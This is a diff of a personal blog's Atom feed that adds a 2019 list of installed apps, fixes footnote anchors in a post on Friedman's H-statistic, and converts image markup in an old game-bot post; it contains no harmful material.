@@ -1,5 +1,61 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Bed Against The Wall</title><link href="http://blog.macuyiko.com/" rel="alternate"></link><link href="http://blog.macuyiko.com/feeds/atom.xml" rel="self"></link><id>http://blog.macuyiko.com/</id><updated>2019-04-07T12:36:00+02:00</updated><entry><title>A Tour of Open MongoDB Instances</title><link href="http://blog.macuyiko.com/post/2019/a-tour-of-open-mongodb-instances.html" rel="alternate"></link><published>2019-04-07T12:36:00+02:00</published><updated>2019-04-07T12:36:00+02:00</updated><author><name>Seppe "Macuyiko" vanden Broucke</name></author><id>tag:blog.macuyiko.com,2019-04-07:/post/2019/a-tour-of-open-mongodb-instances.html</id><summary type="html">&lt;p&gt;Earlier last month, a security researcher called Victor Gevers sent out a &lt;a href="https://twitter.com/0xDUDE/status/1101917885100945409"&gt;tweet&lt;/a&gt; stating that he had stumbled upon a number of open MongoDB databases hosting what was apparantly logged chats from a number of Chinese applications such as Weixin (WeChat) and &lt;span class="caps"&gt;QQ&lt;/span&gt;:&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Bed Against The Wall</title><link href="http://blog.macuyiko.com/" rel="alternate"></link><link href="http://blog.macuyiko.com/feeds/atom.xml" rel="self"></link><id>http://blog.macuyiko.com/</id><updated>2019-05-18T21:23:00+02:00</updated><entry><title>List of Apps (2019)</title><link href="http://blog.macuyiko.com/post/2019/list-of-apps-2019.html" rel="alternate"></link><published>2019-05-18T21:23:00+02:00</published><updated>2019-05-18T21:23:00+02:00</updated><author><name>Seppe "Macuyiko" vanden Broucke</name></author><id>tag:blog.macuyiko.com,2019-05-18:/post/2019/list-of-apps-2019.html</id><summary type="html">&lt;p&gt;It&amp;#8217;s time to setup a new laptop, so &lt;a href="http://blog.macuyiko.com/post/2018/list-of-apps-2018.html"&gt;once again&lt;/a&gt; I&amp;#8217;m jotting down a list of apps I normally install right away, slightly updated&amp;nbsp;again.&lt;/p&gt;
+&lt;h2&gt;Web&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.google.com/chrome/"&gt;Chrome&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.google.com/drive"&gt;Google&amp;nbsp;Drive&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://filezilla-project.org/download.php?type=client"&gt;FileZilla&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Optional:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.qbittorrent.org/"&gt;qBittorrent&lt;/a&gt; install once&amp;nbsp;required&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.dropbox.com/"&gt;Dropbox&lt;/a&gt; to be replaced with Google Drive completely, after their 3 device&amp;nbsp;limit …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;It&amp;#8217;s time to setup a new laptop, so &lt;a href="http://blog.macuyiko.com/post/2018/list-of-apps-2018.html"&gt;once again&lt;/a&gt; I&amp;#8217;m jotting down a list of apps I normally install right away, slightly updated&amp;nbsp;again.&lt;/p&gt;
+&lt;h2&gt;Web&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.google.com/chrome/"&gt;Chrome&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.google.com/drive"&gt;Google&amp;nbsp;Drive&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://filezilla-project.org/download.php?type=client"&gt;FileZilla&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Optional:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.qbittorrent.org/"&gt;qBittorrent&lt;/a&gt; install once&amp;nbsp;required&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.dropbox.com/"&gt;Dropbox&lt;/a&gt; to be replaced with Google Drive completely, after their 3 device&amp;nbsp;limit&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.skype.com/en/"&gt;Skype&lt;/a&gt; is avoided, use web version if&amp;nbsp;possible&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;General&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Microsoft&amp;nbsp;Office&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.7-zip.org/"&gt;7-Zip&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.voidtools.com/"&gt;Everything&lt;/a&gt; to locate files and folders by name&amp;nbsp;instantly.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://justgetflux.com/"&gt;f.lux&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.getpaint.net/"&gt;Paint.&lt;span class="caps"&gt;NET&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.sumatrapdfreader.org/free-pdf-reader.html"&gt;Sumatra &lt;span class="caps"&gt;PDF&lt;/span&gt;&lt;/a&gt; and &lt;a href="https://get.adobe.com/reader/"&gt;Adobe Reader&lt;/a&gt; for those annoying edge cases where Sumatra doesn&amp;#8217;t&amp;nbsp;work.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.virtualbox.org/"&gt;VirtualBox&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.spotify.com"&gt;Spotify&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.videolan.org/vlc/index.html"&gt;&lt;span class="caps"&gt;VLC&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://store.steampowered.com/"&gt;Steam&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.gog.com/galaxy"&gt;&lt;span class="caps"&gt;GOG&lt;/span&gt;&amp;nbsp;Galaxy&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Fonts: Open Sans and Fira Code&amp;nbsp;especially.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.putty.org/"&gt;Putty&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://obsproject.com/"&gt;&lt;span class="caps"&gt;OBS&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.nchsoftware.com/videopad/index.html"&gt;VideoPad&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.gimp.org/"&gt;Gimp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://geekuninstaller.com/"&gt;Geek Uninstaller&lt;/a&gt; to clean up Windows Apps&amp;nbsp;cruft&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Data&amp;nbsp;Science&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.anaconda.com/distribution/"&gt;Anaconda Python&amp;nbsp;Distribution&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.graphviz.org/"&gt;GraphViz&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://cran.r-project.org/"&gt;R&lt;/a&gt; and &lt;a href="http://www.rstudio.com/"&gt;RStudio&lt;/a&gt; although can be replaced by&amp;nbsp;Anaconda&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Coding and&amp;nbsp;Editing&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://code.visualstudio.com/"&gt;VSCode&lt;/a&gt;: excellent and rapidly replacing every other code&amp;nbsp;editor.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://desktop.github.com/"&gt;GitHub&amp;nbsp;Desktop&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://eclipse.org/downloads/"&gt;Eclipse&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.lyx.org/"&gt;LyX&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.winedt.com/"&gt;WinEdt&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content></entry><entry><title>A Tour of Open MongoDB Instances</title><link href="http://blog.macuyiko.com/post/2019/a-tour-of-open-mongodb-instances.html" rel="alternate"></link><published>2019-04-07T12:36:00+02:00</published><updated>2019-04-07T12:36:00+02:00</updated><author><name>Seppe "Macuyiko" vanden Broucke</name></author><id>tag:blog.macuyiko.com,2019-04-07:/post/2019/a-tour-of-open-mongodb-instances.html</id><summary type="html">&lt;p&gt;Earlier last month, a security researcher called Victor Gevers sent out a &lt;a href="https://twitter.com/0xDUDE/status/1101917885100945409"&gt;tweet&lt;/a&gt; stating that he had stumbled upon a number of open MongoDB databases hosting what was apparantly logged chats from a number of Chinese applications such as Weixin (WeChat) and &lt;span class="caps"&gt;QQ&lt;/span&gt;:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Around 364 million online profiles and their …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;Earlier last month, a security researcher called Victor Gevers sent out a &lt;a href="https://twitter.com/0xDUDE/status/1101917885100945409"&gt;tweet&lt;/a&gt; stating that he had stumbled upon a number of open MongoDB databases hosting what was apparantly logged chats from a number of Chinese applications such as Weixin (WeChat) and &lt;span class="caps"&gt;QQ&lt;/span&gt;:&lt;/p&gt;
 &lt;blockquote&gt;
@@ -355,7 +411,7 @@
 &lt;li&gt;Water is just set at the fixed level of 64 (the level Minecraft uses for water), though this ends up filling caves where there is no water in the Minecraft world. An alternative approach would consist of rendering everything including water blocks&amp;nbsp;manually&lt;/li&gt;
 &lt;li&gt;To do so, one would also have to construct their own color map to use as the shader, instead of relying on the built-in &amp;#8220;imhof1&amp;#8221; texture map (e.g. by mapping all block types to a color that matches&amp;nbsp;well)&lt;/li&gt;
 &lt;li&gt;Additionally, you could even construct a map consisting of all blocks in the area, instead of just the top-most one. This would effectively boil down to the same strategy that &lt;a href="https://github.com/ryantimpe/brickr/blob/bb08271bd92dabb1d8182e40ad26cf0024bbb85d/R/bricks_to_3d.R"&gt;&lt;code&gt;brickr&lt;/code&gt; uses&lt;/a&gt; to render more complex models. It&amp;#8217;s not really well documented in &lt;code&gt;rayshader&lt;/code&gt;, but it seems to be possible to render multiple height levels on top of each other through multiple &lt;code&gt;plot_3d&lt;/code&gt; calls&lt;/li&gt;
-&lt;/ul&gt;</content></entry><entry><title>Discovering Interaction Effects in Ensemble Models</title><link href="http://blog.macuyiko.com/post/2019/discovering-interaction-effects-in-ensemble-models.html" rel="alternate"></link><published>2019-02-22T20:10:00+01:00</published><updated>2019-02-22T20:10:00+01:00</updated><author><name>Seppe "Macuyiko" vanden Broucke</name></author><id>tag:blog.macuyiko.com,2019-02-22:/post/2019/discovering-interaction-effects-in-ensemble-models.html</id><summary type="html">&lt;p&gt;Throughout the past year or so, both R and Python focused data science practioners have picked up on a &lt;a href="https://arxiv.org/pdf/0811.1679.pdf"&gt;paper by Friedman and Popescu&lt;/a&gt; from 2008 entitled Predictive Learning Via Rule Ensembles. Interestingly enough, the &amp;#8220;meat&amp;#8221; of the paper &amp;#8212; at least in the context we&amp;#8217;ll discuss here &amp;#8212; is found …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Throughout the past year or so, both R and Python focused data science practioners have picked up on a &lt;a href="https://arxiv.org/pdf/0811.1679.pdf"&gt;paper by Friedman and Popescu&lt;/a&gt; from 2008 entitled Predictive Learning Via Rule Ensembles. Interestingly enough, the &amp;#8220;meat&amp;#8221; of the paper &amp;#8212; at least in the context we&amp;#8217;ll discuss here &amp;#8212; is found in the latter half, where a helpful statistic is proposed to assess interaction effects between variables in an ensemble model &lt;sup id="fnref-fn1"&gt;&lt;a class="footnote-ref" href="#fn-fn1"&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;/ul&gt;</content></entry><entry><title>Discovering Interaction Effects in Ensemble Models</title><link href="http://blog.macuyiko.com/post/2019/discovering-interaction-effects-in-ensemble-models.html" rel="alternate"></link><published>2019-02-22T20:10:00+01:00</published><updated>2019-02-22T20:10:00+01:00</updated><author><name>Seppe "Macuyiko" vanden Broucke</name></author><id>tag:blog.macuyiko.com,2019-02-22:/post/2019/discovering-interaction-effects-in-ensemble-models.html</id><summary type="html">&lt;p&gt;Throughout the past year or so, both R and Python focused data science practioners have picked up on a &lt;a href="https://arxiv.org/pdf/0811.1679.pdf"&gt;paper by Friedman and Popescu&lt;/a&gt; from 2008 entitled Predictive Learning Via Rule Ensembles. Interestingly enough, the &amp;#8220;meat&amp;#8221; of the paper &amp;#8212; at least in the context we&amp;#8217;ll discuss here &amp;#8212; is found …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Throughout the past year or so, both R and Python focused data science practioners have picked up on a &lt;a href="https://arxiv.org/pdf/0811.1679.pdf"&gt;paper by Friedman and Popescu&lt;/a&gt; from 2008 entitled Predictive Learning Via Rule Ensembles. Interestingly enough, the &amp;#8220;meat&amp;#8221; of the paper &amp;#8212; at least in the context we&amp;#8217;ll discuss here &amp;#8212; is found in the latter half, where a helpful statistic is proposed to assess interaction effects between variables in an ensemble model &lt;sup id="fnref:fn1"&gt;&lt;a class="footnote-ref" href="#fn:fn1"&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
 &lt;p&gt;Together with feature importance rankings and partial dependence plots, getting an idea of which variables interact is an effective means to make black-box models more understandable, especially since the latter can effect how you look at the former&amp;nbsp;two.&lt;/p&gt;
 &lt;p&gt;The reason why I initially became interested in this idea was in a setting where a well-performing random forest model had to be converted to a (hopefully just as well performing) logistic regression model for deployment reasons. In this setting, getting some insights from the ensemble model in terms of which variables to keep is quite&amp;nbsp;useful.&lt;/p&gt;
 &lt;h2&gt;Feature&amp;nbsp;Importance&lt;/h2&gt;
@@ -424,7 +480,7 @@ random forest rankings:     [[0.42673270], [0.43211179], [1.24873006]]
 &lt;p&gt;(Not that there would necessarily be any guarantee for this average &lt;span class="caps"&gt;ICE&lt;/span&gt; line to be exactly the same as the partial dependence plot as described above. It depends somewhat on the intricacies of the learner, though averages are such a&amp;#8230; well, central, concept in virtually all learners that the results will be virtually similar. Again, this would make for a nice topic to explore further both from an empirical and theoretical&amp;nbsp;perspective.)&lt;/p&gt;
 &lt;p&gt;In any case, we now have the building blocks required to finally delve into what we&amp;#8217;re interested in here. As one can observe, &lt;span class="caps"&gt;ICE&lt;/span&gt; plots are better suited to warn a user against interpreting a &amp;#8220;partial dependency&amp;#8221;, though can still make it quite hard to uncover the full extent of interactions. Again, when limiting oneself to the setting of two features, the concept of &lt;span class="caps"&gt;ICE&lt;/span&gt; plots is easily ported. This is the result for x0 * x1, for instance. The &lt;span class="caps"&gt;ICE&lt;/span&gt; plot clearly indicates the presence of an interaction, as would a standard partial dependence&amp;nbsp;plot:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="ICE plot for x0*x1" src="/images/2018/hstat4.png"&gt;&lt;/p&gt;
-&lt;p&gt;Though again, the question remains: how do we systematically extract deeper interactions, given that visualizations cannot help us much in this setting&lt;sup id="fnref-fn2"&gt;&lt;a class="footnote-ref" href="#fn-fn2"&gt;2&lt;/a&gt;&lt;/sup&gt;?&lt;/p&gt;
+&lt;p&gt;Though again, the question remains: how do we systematically extract deeper interactions, given that visualizations cannot help us much in this setting&lt;sup id="fnref:fn2"&gt;&lt;a class="footnote-ref" href="#fn:fn2"&gt;2&lt;/a&gt;&lt;/sup&gt;?&lt;/p&gt;
 &lt;h2&gt;Introducing Friedman&amp;#8217;s&amp;nbsp;H-statistic&lt;/h2&gt;
 &lt;p&gt;The interpretable &lt;span class="caps"&gt;ML&lt;/span&gt; book by Christoph Molnar &lt;a href="https://christophm.github.io/interpretable-ml-book/interaction.html"&gt;actually gives us a workable approach&lt;/a&gt;, by using Friedman&amp;#8217;s H-statistic based on decomposition of the partial dependence&amp;nbsp;values.&lt;/p&gt;
 &lt;p&gt;The book describes both &amp;#8220;versions&amp;#8221; of the&amp;nbsp;H-statistic:&lt;/p&gt;
@@ -671,14 +727,14 @@ random forest:
 &lt;div class="footnote"&gt;
 &lt;hr&gt;
 &lt;ol&gt;
-&lt;li id="fn-fn1"&gt;
-&lt;p&gt;Or in fact any predictive model.&amp;#160;&lt;a class="footnote-backref" href="#fnref-fn1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;li id="fn:fn1"&gt;
+&lt;p&gt;Or in fact any predictive model.&amp;#160;&lt;a class="footnote-backref" href="#fnref:fn1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
 &lt;/li&gt;
-&lt;li id="fn-fn2"&gt;
-&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Deep&amp;#8221; being a quip to deep learning, of course. One could argue that the bulk of deep learning consists of (i) extracting very non-linear effects, (ii) extracting very deep interactions &lt;sup id="fnref-fn3"&gt;&lt;a class="footnote-ref" href="#fn-fn3"&gt;3&lt;/a&gt;&lt;/sup&gt; and (iii) performing complex feature transformations.&amp;#160;&lt;a class="footnote-backref" href="#fnref-fn2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;li id="fn:fn2"&gt;
+&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Deep&amp;#8221; being a quip to deep learning, of course. One could argue that the bulk of deep learning consists of (i) extracting very non-linear effects, (ii) extracting very deep interactions &lt;sup id="fnref:fn3"&gt;&lt;a class="footnote-ref" href="#fn:fn3"&gt;3&lt;/a&gt;&lt;/sup&gt; and (iii) performing complex feature transformations.&amp;#160;&lt;a class="footnote-backref" href="#fnref:fn2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
 &lt;/li&gt;
-&lt;li id="fn-fn3"&gt;
-&lt;p&gt;There is a lot of folklore around how deep interactions can go. Some practitioners indicate that everything beyond two-way interactions is either non-existent or simply a sign of overfitting when working with real-life data. Often the same practitioners who indicate that most data sets are linearly separable anyway. For most industry-based tabular data sets, I&amp;#8217;m in fact still inclined to believe them, though exceptions can and do make the rule.&amp;#160;&lt;a class="footnote-backref" href="#fnref-fn3" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;li id="fn:fn3"&gt;
+&lt;p&gt;There is a lot of folklore around how deep interactions can go. Some practitioners indicate that everything beyond two-way interactions is either non-existent or simply a sign of overfitting when working with real-life data. Often the same practitioners who indicate that most data sets are linearly separable anyway. For most industry-based tabular data sets, I&amp;#8217;m in fact still inclined to believe them, though exceptions can and do make the rule.&amp;#160;&lt;a class="footnote-backref" href="#fnref:fn3" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;/div&gt;</content></entry><entry><title>An Exploration of Cellular Automata and Graph Based Game Systems: Part 3</title><link href="http://blog.macuyiko.com/post/2018/an-exploration-of-cellular-automata-and-graph-based-game-systems-part-3.html" rel="alternate"></link><published>2018-08-03T21:09:00+02:00</published><updated>2018-08-03T21:09:00+02:00</updated><author><name>Seppe "Macuyiko" vanden Broucke</name></author><id>tag:blog.macuyiko.com,2018-08-03:/post/2018/an-exploration-of-cellular-automata-and-graph-based-game-systems-part-3.html</id><summary type="html">&lt;script&gt;
@@ -10267,72 +10323,83 @@ using minimax as&amp;nbsp;well.&lt;/p&gt;
 &lt;h3&gt;A small selection of&amp;nbsp;rounds&lt;/h3&gt;
 &lt;p&gt;I&amp;#8217;m including some final rounds to show where my bot did well, and where it
 performed&amp;nbsp;poorly.&lt;/p&gt;
-&lt;p&gt;![](http://4.bp.blogspot.com/_X4W-h82Vgjw/S40zMMa5LgI/&lt;span class="caps"&gt;AAAAAAAAPVQ&lt;/span&gt;/D2y-&amp;nbsp;QyMkIrY/s200/game1_1.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://4.bp.blogspot.com/_X4W-h82Vgjw/S40zMMa5LgI/AAAAAAAAPVQ/D2y-
+QyMkIrY/s200/game1_1.png"&gt;&lt;/p&gt;
 &lt;p&gt;The first game starts of like this. My bot is&amp;nbsp;red.&lt;/p&gt;
-&lt;p&gt;![](http://1.bp.blogspot.com/_X4W-
-h82Vgjw/S40zSO6_dbI/&lt;span class="caps"&gt;AAAAAAAAPVU&lt;/span&gt;/oLvgFvVb8yA/s200/game1_2.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://1.bp.blogspot.com/_X4W-
+h82Vgjw/S40zSO6_dbI/AAAAAAAAPVU/oLvgFvVb8yA/s200/game1_2.png"&gt;&lt;/p&gt;
 &lt;p&gt;The board after a few moves. Our bot senses it can reach a wall to block our
 opponent of by going&amp;nbsp;east&amp;#8230;&lt;/p&gt;
-&lt;p&gt;![](http://4.bp.blogspot.com/_X4W-
-h82Vgjw/S40zWTKFJOI/&lt;span class="caps"&gt;AAAAAAAAPVY&lt;/span&gt;/00ZwMbDZOWQ/s200/game1_3.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://4.bp.blogspot.com/_X4W-
+h82Vgjw/S40zWTKFJOI/AAAAAAAAPVY/00ZwMbDZOWQ/s200/game1_3.png"&gt;&lt;/p&gt;
 &lt;p&gt;Which is what happens here. It&amp;#8217;s easy to see we&amp;#8217;ve won&amp;nbsp;now.&lt;/p&gt;
-&lt;p&gt;![](http://4.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S40zayPFGmI/AAAAAAAAPVc/Sy82jJS_Zjw/s200/game1_4.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://4.bp.blogspot.com/_X4W-
+h82Vgjw/S40zayPFGmI/AAAAAAAAPVc/Sy82jJS_Zjw/s200/game1_4.png"&gt;&lt;/p&gt;
 &lt;p&gt;Our opponent makes optimal use of the remaining space, but&amp;nbsp;loses.&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;![](http://3.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S40ziJsPQpI/AAAAAAAAPVg/qfsp585DN-k/s200/game2_1.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://3.bp.blogspot.com/_X4W-
+h82Vgjw/S40ziJsPQpI/AAAAAAAAPVg/qfsp585DN-k/s200/game2_1.png"&gt;&lt;/p&gt;
 &lt;p&gt;The second game. We&amp;#8217;re red&amp;nbsp;again.&lt;/p&gt;
-&lt;p&gt;![](http://2.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S40zmK8FPFI/AAAAAAAAPVk/XQoqkw8WuKM/s200/game2_2.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://2.bp.blogspot.com/_X4W-
+h82Vgjw/S40zmK8FPFI/AAAAAAAAPVk/XQoqkw8WuKM/s200/game2_2.png"&gt;&lt;/p&gt;
 &lt;p&gt;We&amp;#8217;ve been chasing blue for a&amp;nbsp;bit.&lt;/p&gt;
-&lt;p&gt;![](http://2.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S40zqEWnZmI/AAAAAAAAPVo/L-7DnhWH5-s/s200/game2_3.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://2.bp.blogspot.com/_X4W-
+h82Vgjw/S40zqEWnZmI/AAAAAAAAPVo/L-7DnhWH5-s/s200/game2_3.png"&gt;&lt;/p&gt;
 &lt;p&gt;To close in on blue, we need to go the other way around. But due to our
 aggressive manoeuvres, we&amp;#8217;ve made a&amp;nbsp;mistake.&lt;/p&gt;
-&lt;p&gt;![](http://1.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S40zu_gWtjI/AAAAAAAAPVs/U8wAQLbr-M4/s200/game2_4.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://1.bp.blogspot.com/_X4W-
+h82Vgjw/S40zu_gWtjI/AAAAAAAAPVs/U8wAQLbr-M4/s200/game2_4.png"&gt;&lt;/p&gt;
 &lt;p&gt;Blue exploits our mistakes and blocks us off. Well&amp;nbsp;done.&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;![](http://3.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S40z01RGLaI/AAAAAAAAPVw/v77txiOUSpQ/s200/game3_1.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://3.bp.blogspot.com/_X4W-
+h82Vgjw/S40z01RGLaI/AAAAAAAAPVw/v77txiOUSpQ/s200/game3_1.png"&gt;&lt;/p&gt;
 &lt;p&gt;A new game, we&amp;#8217;re red&amp;nbsp;again.&lt;/p&gt;
-&lt;p&gt;![](http://2.bp.blogspot.com/_X4W-
-h82Vgjw/S40z4mlqvRI/&lt;span class="caps"&gt;AAAAAAAAPV0&lt;/span&gt;/wH8s8jaroKU/s200/game3_2.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://2.bp.blogspot.com/_X4W-
+h82Vgjw/S40z4mlqvRI/AAAAAAAAPV0/wH8s8jaroKU/s200/game3_2.png"&gt;&lt;/p&gt;
 &lt;p&gt;The first moves start of pretty&amp;nbsp;symmetric.&lt;/p&gt;
-&lt;p&gt;![](http://1.bp.blogspot.com/_X4W-h82Vgjw/S40z8uQpHCI/&lt;span class="caps"&gt;AAAAAAAAPV4&lt;/span&gt;/CH2nGH-&amp;nbsp;YMBg/s200/game3_3.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://1.bp.blogspot.com/_X4W-h82Vgjw/S40z8uQpHCI/AAAAAAAAPV4/CH2nGH-
+YMBg/s200/game3_3.png"&gt;&lt;/p&gt;
 &lt;p&gt;We&amp;#8217;re chasing our opponent for a bit. Since we cannot reach him by going north
 anymore, we&amp;#8217;ll go down&amp;nbsp;now&amp;#8230;&lt;/p&gt;
-&lt;p&gt;![](http://3.bp.blogspot.com/_X4W-
-h82Vgjw/S400ApI6mPI/&lt;span class="caps"&gt;AAAAAAAAPV8&lt;/span&gt;/C7fzgJ0HwUI/s200/game3_4.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://3.bp.blogspot.com/_X4W-
+h82Vgjw/S400ApI6mPI/AAAAAAAAPV8/C7fzgJ0HwUI/s200/game3_4.png"&gt;&lt;/p&gt;
 &lt;p&gt;Which is what happens here. Our bot quickly senses that we can close blue off.
 It&amp;#8217;s pretty hard to eyeball here that we&amp;#8217;ll end up with more room then blue,
 but our bot seems to be&amp;nbsp;confident.&lt;/p&gt;
-&lt;p&gt;![](http://3.bp.blogspot.com/_X4W-
-h82Vgjw/S400E86mIHI/&lt;span class="caps"&gt;AAAAAAAAPWA&lt;/span&gt;/xDc2nh20D8Q/s200/game3_5.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://3.bp.blogspot.com/_X4W-
+h82Vgjw/S400E86mIHI/AAAAAAAAPWA/xDc2nh20D8Q/s200/game3_5.png"&gt;&lt;/p&gt;
 &lt;p&gt;Indeed, a few seconds later the situation looks like this. It&amp;#8217;s clear we&amp;#8217;ve&amp;nbsp;won.&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;![](http://1.bp.blogspot.com/_X4W-
-h82Vgjw/&lt;span class="caps"&gt;S400KOEWHPI&lt;/span&gt;/&lt;span class="caps"&gt;AAAAAAAAPWE&lt;/span&gt;/6Dplv6x4NlY/s200/game4_1.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://1.bp.blogspot.com/_X4W-
+h82Vgjw/S400KOEWHPI/AAAAAAAAPWE/6Dplv6x4NlY/s200/game4_1.png"&gt;&lt;/p&gt;
 &lt;p&gt;Another game. Now we&amp;#8217;re in blue. I&amp;#8217;m picking this round because my bot had a
 lot of problems with this&amp;nbsp;setup.&lt;/p&gt;
-&lt;p&gt;![](http://2.bp.blogspot.com/_X4W-
-h82Vgjw/S400Np8LBXI/&lt;span class="caps"&gt;AAAAAAAAPWI&lt;/span&gt;/dHPrVl_rGeg/s200/game4_2.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://2.bp.blogspot.com/_X4W-
+h82Vgjw/S400Np8LBXI/AAAAAAAAPWI/dHPrVl_rGeg/s200/game4_2.png"&gt;&lt;/p&gt;
 &lt;p&gt;By chasing our opponent, we&amp;#8217;re getting ourselves in a lot of&amp;nbsp;trouble.&lt;/p&gt;
-&lt;p&gt;![](http://4.bp.blogspot.com/_X4W-
-h82Vgjw/S400RTFHgFI/&lt;span class="caps"&gt;AAAAAAAAPWM&lt;/span&gt;/kTIUrzsghf0/s200/game4_3.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://4.bp.blogspot.com/_X4W-
+h82Vgjw/S400RTFHgFI/AAAAAAAAPWM/kTIUrzsghf0/s200/game4_3.png"&gt;&lt;/p&gt;
 &lt;p&gt;And indeed, a few moves later, red can easily corner&amp;nbsp;us.&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;![](http://1.bp.blogspot.com/_X4W-
-h82Vgjw/S400XKOpEtI/&lt;span class="caps"&gt;AAAAAAAAPWQ&lt;/span&gt;/1TFNges609I/s200/game5_1.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://1.bp.blogspot.com/_X4W-
+h82Vgjw/S400XKOpEtI/AAAAAAAAPWQ/1TFNges609I/s200/game5_1.png"&gt;&lt;/p&gt;
